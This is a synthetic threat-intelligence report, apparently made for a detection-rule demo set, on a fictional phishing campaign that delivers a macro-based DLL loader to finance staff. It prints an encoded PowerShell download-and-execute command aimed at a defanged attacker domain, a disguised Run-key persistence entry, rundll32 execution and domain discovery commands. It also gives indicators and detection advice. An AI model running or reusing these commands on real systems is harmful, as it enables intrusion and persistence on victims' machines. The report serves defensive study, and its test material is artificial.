# Finance-sector phishing campaign delivering the "QuietLedger" loader

> Synthetic report written for RuleSmith's offline demo and evaluation set. The tradecraft mirrors widely published public reporting on macro-based loaders; names, hashes and infrastructure are fictional and no real victim data is included.

## Summary

Between 2 and 14 October 2026 we observed a targeted phishing campaign against accounts-payable staff at mid-sized financial services firms in Singapore, Australia and the UK. The lure was an "overdue invoice" email with a macro-enabled Word attachment (`Invoice_Q3_2211.docm`). Opening the document and enabling content executed a VBA macro that launched PowerShell with an encoded command, which downloaded and staged a DLL loader we track as QuietLedger. The loader persisted through a Run key, was executed via `rundll32.exe`, performed host and domain discovery, and beaconed to attacker infrastructure over HTTPS.

## Initial access

The attachment was delivered from compromised third-party mailboxes with subject lines such as "Overdue: invoice 2211 (second notice)". The document contained an `AutoOpen` macro obfuscated with string reversal. When the victim clicked "Enable Content", `WINWORD.EXE` spawned `powershell.exe` with the following command line (base64 abbreviated):

```
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAHMALgBxAHUAaQBlAHQAbABlAGQAZwBlAHIAWwAuAF0AbgBlAHQALwBhAC4AcABzADEAJwApAA==
```

Decoded, the command uses `IEX (New-Object Net.WebClient).DownloadString('https://cdn-updates.quietledger[.]net/a.ps1')`. In two cases the parent was `EXCEL.EXE` rather than `WINWORD.EXE`, as the same actor also sent `.xlsm` variants. The second-stage script wrote the loader DLL to `C:\Users\<user>\AppData\Roaming\Microsoft\Vault\ldgr.dll`.

## Persistence

The script then created a Run key so the loader survives reboots:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpd
Value: rundll32.exe "C:\Users\<user>\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW
```

The value name mimics the legitimate OneDrive updater. We also observed the equivalent key under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` on hosts where the user was a local administrator.

## Execution

`rundll32.exe` executed the DLL from the AppData path with the exported function `StartW`:

```
rundll32.exe "C:\Users\jlee\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW
```

The parent of this `rundll32.exe` was `explorer.exe` at logon (via the Run key) and `powershell.exe` on first execution. Legitimate `rundll32.exe` usage in the victim environments loaded DLLs from `C:\Windows\System32` or `C:\Program Files`, never from a user's AppData directory.

## Discovery

Within five minutes of execution the loader ran a fixed discovery sequence through `cmd.exe /c`:

```
whoami /all
nltest /dclist:
net group "Domain Admins" /domain
net user /domain
systeminfo
```

These were executed as children of the `rundll32.exe` process hosting the loader, which is unusual: `rundll32.exe` spawning `cmd.exe`, `whoami.exe`, `nltest.exe` or `net.exe` was not observed anywhere in baseline telemetry.

## Command and control

QuietLedger beacons every 90 seconds to `cdn-updates.quietledger[.]net` and `static.ledger-sync[.]com` on TCP/443 using the User-Agent string `Mozilla/5.0 (Windows NT 10.0; Win64; x64) LedgerSync/2.4`. The beaconing process is `rundll32.exe`, which in the affected environments does not normally initiate outbound HTTPS connections. Observed infrastructure resolved to 203.0.113.41 and 198.51.100.77.

## Indicators of compromise

| Type | Value |
|---|---|
| SHA256 (Invoice_Q3_2211.docm) | 7c3f1a0d9e8b5c4a2f6e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a |
| SHA256 (ldgr.dll) | 1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809 |
| Domain | cdn-updates.quietledger[.]net |
| Domain | static.ledger-sync[.]com |
| IP | 203.0.113.41, 198.51.100.77 |

## Recommendations

Block macros from the internet zone, alert on Office applications spawning PowerShell, alert on `rundll32.exe` loading DLLs from user-writable paths, and review Run keys whose value names imitate OneDrive, Teams or Google updaters but point outside their expected install directories.
